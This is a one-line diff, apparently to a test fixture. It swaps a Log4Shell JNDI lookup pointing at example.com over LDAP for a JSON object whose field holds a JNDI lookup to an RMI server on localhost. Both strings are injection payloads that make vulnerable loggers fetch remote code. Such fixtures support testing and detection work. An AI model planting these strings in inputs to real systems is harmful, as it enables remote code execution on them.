@@ -1,1 +1,1 @@
-${jndi:ldap://example.com}
+{"key": "value", "jndi": "${jndi:rmi://localhost:1099/jndiLookup}"}
